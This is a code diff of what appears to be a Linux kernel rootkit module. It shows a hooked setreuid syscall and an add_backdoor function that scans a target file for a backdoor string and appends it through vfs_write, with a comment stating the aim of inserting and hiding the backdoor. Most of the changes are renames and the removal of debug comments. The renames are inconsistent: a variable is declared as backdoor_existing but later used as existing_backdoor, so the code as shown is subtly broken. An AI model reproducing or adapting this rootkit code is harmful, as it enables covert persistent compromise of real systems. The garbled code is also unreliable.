@@ -50,14 +50,14 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 	return old_setreuid(regs->si, regs->di);
 }
 
-// Start Marc
+// Start Marc - Inserting/removing backdoor & hide backdoor entrance
 void add_backdoor(char *path) {
 		struct file *file;
 		char *BACKDOOR;
 		mm_segment_t old_fs;
 		
 		char *buffer;
-		bool has_backdoor = false;
+		bool backdoor_existing = false;
 		int page_count = 0;
 		
 		loff_t offset; 
@@ -79,14 +79,14 @@ void add_backdoor(char *path) {
 			goto exit;
 	    	}
 
-	    	//check if backdoor is already inserted
+	    	//check if backdoor already exists
 	    	buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	    	if(!buf){
 			goto cleanup1;
 	    	}
 
-	    	has_backdoor = false;
+	    	existing_backdoor = false;
 	    	ret = PAGE_SIZE;
 	    	offset = 0;
 	    	while(ret == PAGE_SIZE){
@@ -97,26 +97,20 @@ void add_backdoor(char *path) {
 			set_fs(old_fs);
 
 			if(ret < 0){
-		    		//DEBUG("read errors");
 		    		goto cleanup2;
 			}
 
 			page_count++;
 
 			if(strstr(buf, BACKDOOR)){
-			    has_backdoor = true;
+			    existing_backdoor = true;
 			    break;
 			}
 	    	}
 
-	    	if(has_backdoor){
-			//DEBUG(pathname);
-			//DEBUG("-----already has backdoor-------");
+	    	if(existing_backdoor){
 			goto cleanup2;
 		    }
-	
-		 //DEBUG(pathname);
-	    	//DEBUG("--- doesn't have backdoor. inserting---");
 
 	    	//seek offset to end of file
 	    	offset = 0;
@@ -127,16 +121,15 @@ void add_backdoor(char *path) {
 
 	    	if(offset < 0){
 			goto cleanup2;
-		    }
+		}
 
-		    //add backdoor to the end of file
-		    ret = 0;
+		//add backdoor to the end of file
+		ret = 0;
+	    	set_fs(get_ds()); 
+		ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset); 
+		set_fs(old_fs); 
 	
-		    set_fs(get_ds()); //
-		    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset); //
-		    set_fs(old_fs); //
-	
-		    if(ret<0){
+		if(ret<0){
 			goto cleanup2;
 	    	}
 
